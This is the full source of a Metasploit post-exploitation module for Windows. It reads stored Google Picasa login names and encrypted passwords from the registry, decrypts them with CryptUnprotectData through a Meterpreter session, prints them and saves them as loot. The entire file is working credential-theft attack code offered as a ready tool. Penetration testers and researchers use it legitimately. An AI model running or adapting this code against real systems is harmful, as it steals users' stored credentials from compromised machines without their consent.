##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Google Picasa Password Extractor',
        'Description' => %q{
          This module extracts and decrypts the login passwords
          stored by Google Picasa.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Unknown', # SecurityXploded Team, www.SecurityXploded.com
          'Sil3ntDre4m <sil3ntdre4m[at]gmail.com>',
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_railgun_api
              stdapi_sys_config_getuid
              stdapi_sys_process_attach
              stdapi_sys_process_get_processes
              stdapi_sys_process_getpid
              stdapi_sys_process_memory_allocate
              stdapi_sys_process_memory_read
              stdapi_sys_process_memory_write
            ]
          }
        }
      )
    )
  end

  def prepare_railgun
    if !session.railgun.get_dll('crypt32')
      session.railgun.add_dll('crypt32')
    end
  end

  def decrypt_password(data)
    pid = client.sys.process.getpid
    process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)

    mem = process.memory.allocate(512)
    process.memory.write(mem, data)

    if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'
      addr = [mem].pack('V')
      len = [data.length].pack('V')
      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
      len, addr = ret['pDataOut'].unpack('V2')
    else
      addr = [mem].pack('Q')
      len = [data.length].pack('Q')
      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
      len, addr = ret['pDataOut'].unpack('Q2')
    end

    return '' if len == 0

    decrypted_pw = process.memory.read(addr, len)
    return decrypted_pw
  end

  def get_registry
    print_status('Looking in registry for stored login passwords by Picasa ...')

    username = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\', 'GaiaEmail') || ''
    password = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\', 'GaiaPass') || ''

    credentials = Rex::Text::Table.new(
      'Header' => 'Picasa Credentials',
      'Indent' => 1,
      'Columns' =>
      [
        'User',
        'Password'
      ]
    )

    foundcreds = 0
    if !username.empty? && !password.empty?
      passbin = [password].pack('H*')
      pass = decrypt_password(passbin)

      if pass && !pass.empty?
        print_status('Found Picasa 2 credentials.')
        print_good("Username: #{username}\t Password: #{pass}")

        foundcreds = 1
        credentials << [username, pass]
      end
    end

    # For early versions of Picasa3
    username = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\', 'GaiaEmail') || ''
    password = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\', 'GaiaPass') || ''

    if !username.empty? && !password.empty?
      passbin = [password].pack('H*')
      pass = decrypt_password(passbin)

      if pass && !pass.empty?
        print_status('Found Picasa 3 credentials.')
        print_good("Username: #{username}\t Password: #{pass}")

        foundcreds = 1
        credentials << [username, pass]
      end
    end

    if foundcreds == 1
      path = store_loot(
        'picasa.creds',
        'text/csv',
        session,
        credentials.to_csv,
        'decrypted_picasa_data.csv',
        'Decrypted Picasa Passwords'
      )

      print_status("Decrypted passwords saved in: #{path}")
    else
      print_status('No Picasa credentials found.')
    end
  rescue StandardError => e
    print_error("An error has occurred: #{e}")
  end

  def run
    uid = session.sys.config.getuid # Decryption only works in context of user's account.

    if is_system?
      print_error("This module is running under #{uid}.")
      print_error('Automatic decryption will not be possible.')
      print_error('Migrate to a user process to achieve successful decryption (e.g. explorer.exe).')
    else
      prepare_railgun
      get_registry
    end

    print_status('Done')
  end
end
